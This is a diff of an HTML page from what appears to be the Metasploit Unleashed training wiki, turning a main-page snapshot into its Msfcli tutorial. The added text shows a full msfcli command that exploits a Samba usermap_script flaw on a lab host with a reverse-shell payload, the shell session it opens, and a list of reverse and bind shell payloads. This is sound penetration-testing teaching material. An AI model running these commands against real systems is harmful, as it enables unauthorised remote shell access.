@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Msfcli - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Msfcli" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Msfcli&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Msfcli&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Msfcli&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,282 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Msfcli</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Msfcli#column-one">navigation</a>, <a href="Msfcli#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Msfcli provides a powerful command-line interface to the framework.
 <br />
+<br />
+<pre>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfcli -h</span>
+Usage: /opt/metasploit/msf3/msfcli <exploit_name> <option=value> [mode]
+======================================================================
+
+    Mode           Description
+    ----           -----------
+    (A)dvanced     Show available advanced options for this module
+    (AC)tions      Show available actions for this auxiliary module
+    (C)heck        Run the check routine of the selected module
+    (E)xecute      Execute the selected module
+    (H)elp         You're looking at it baby!
+    (I)DS Evasion  Show available ids evasion options for this module
+    (O)ptions      Show available options for this module
+    (P)ayloads     Show available payloads for this module
+    (S)ummary      Show information about this module
+    (T)argets      Show available targets for this exploit module
+</pre>
+<br />
+<br />
+Note that when using msfcli, variables are assigned using '=' and that all options are case-sensitive.
+<br />
+<br />
+<pre>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/reverse LHOST=172.16.194.163 E</span>
+<span style='color:#0000FF;'>[*]</span> Please wait while we load the module tree...
+ 
+<span style='color:#00ffff;'>                ##                          ###           ##    ##
+ ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+                                      ##</span>
+
+
+       =[<span style='color:#FFFF00;'> metasploit v4.5.0-dev [core:4.5 api:1.0]</span>
++ -- --=[ 936 exploits - 500 auxiliary - 151 post
++ -- --=[ 252 payloads - 28 encoders - 8 nops
+       =[ svn r15767 updated today (2012.08.22)
+
+RHOST => 172.16.194.172
+PAYLOAD => cmd/unix/reverse
+<span style='color:#0000FF;'>[*]</span> Started reverse double handler
+<span style='color:#0000FF;'>[*]</span> Accepted the first client connection...
+<span style='color:#0000FF;'>[*]</span> Accepted the second client connection...
+<span style='color:#0000FF;'>[*]</span> Command: echo cSKqD83oiquo0xMr;
+<span style='color:#0000FF;'>[*]</span> Writing to socket A
+<span style='color:#0000FF;'>[*]</span> Writing to socket B
+<span style='color:#0000FF;'>[*]</span> Reading from sockets...
+<span style='color:#0000FF;'>[*]</span> Reading from socket B
+<span style='color:#0000FF;'>[*]</span> B: "cSKqD83oiquo0xMr\r\n"
+<span style='color:#0000FF;'>[*]</span> Matching...
+<span style='color:#0000FF;'>[*]</span> A is input...
+<span style='color:#0000FF;'>[*]</span> Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:57682) at 2012-06-14 09:58:19 -0400
+
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+
+</pre>
+<br />
+If you aren't entirely sure about what options belong to a particular module, you can append the letter 'O' to the end of the string at whichever point you are stuck.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfcli exploit/multi/samba/usermap_script O</span>
+<span style='color:#0000FF;'>[*]</span> Please wait while we load the module tree...
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  139              yes       The target port
+
+</pre>
+<br />
+To display the payloads that are available for the current module, append the letter 'P' to the command-line string.
+<br />
+<br />
+<pre><span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#13C16A;'>msfcli exploit/multi/samba/usermap_script P</span>
+<span style='color:#0000FF;'>[*]</span> Please wait while we load the module tree...
+
+Compatible payloads
+===================
+
+   Name                       Description
+   ----                       -----------
+   cmd/unix/bind_inetd        Listen for a connection and spawn a command shell (persistent)
+   cmd/unix/bind_netcat       Listen for a connection and spawn a command shell via netcat
+   cmd/unix/bind_netcat_ipv6  Listen for a connection and spawn a command shell via netcat
+   cmd/unix/bind_perl         Listen for a connection and spawn a command shell via perl
+   cmd/unix/bind_perl_ipv6    Listen for a connection and spawn a command shell via perl
+   cmd/unix/bind_ruby         Continually listen for a connection and spawn a command shell via Ruby
+   cmd/unix/bind_ruby_ipv6    Continually listen for a connection and spawn a command shell via Ruby
+   cmd/unix/generic           Executes the supplied command
+   cmd/unix/reverse           Creates an interactive shell through two inbound connections
+   cmd/unix/reverse_netcat    Creates an interactive shell via netcat
+   cmd/unix/reverse_perl      Creates an interactive shell via perl
+   cmd/unix/reverse_ruby      Connect back and create a command shell via Ruby
+
+</pre>
+<br />
+The other options available to msfcli are available by issuing 'msfcli -h'.
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<h4> <span class="mw-headline" id="Benefits_of_mscli">Benefits of mscli</span></h4>
+<dl><dd><ul><li>Supports the launching of exploits and auxiliary modules
+</li><li>Useful for specific tasks
+</li><li>Good for learning
+</li><li>Convenient to use when testing or developing a new exploit
+</li><li>Good tool for one-off exploitation
+</li><li>Excellent if you know exactly which exploit and options you need
+</li><li>Wonderful for use in scripts and basic automation
+</li></ul>
+</dd></dl>
 <p><br />
+The only real drawback of msfcli is that it is not supported quite as well as msfconsole and it can only handle one shell at a time, making it rather impractical for client-side attacks. It also doesn't support any of the advanced automation features of msfconsole.
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+</p>
+<div class="Total1"><a href="Metasploit_Fundamentals" title="Metasploit Fundamentals">Metasploit Fundamentals</a> &gt; Msfcli</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Msfcli</strong> &#124; <a href="Msfconsole" title="Msfconsole">Msfconsole</a> &#124; <a href="Exploits" title="Exploits">Exploits</a> &#124; <a href="Payloads" title="Payloads">Payloads</a> &#124; <a href="Databases" title="Databases">Databases</a> &#124; <a href="About_Meterpreter" title="About Meterpreter">About Meterpreter</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 539/1000000
+Preprocessor generated node count: 2681/1000000
+Post‐expand include size: 2900/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:18-0!*!0!*!*!*!* and timestamp 20131124085734 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Msfcli&amp;oldid=1519">http://www.offensive-security.com/w/index.php?title=Msfcli&amp;oldid=1519</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Metasploit_Fundamentals&amp;action=edit&amp;redlink=1" class="new" title="Category:Metasploit Fundamentals (page does not exist)">Metasploit Fundamentals</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +767,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.164 secs. --></body></html>
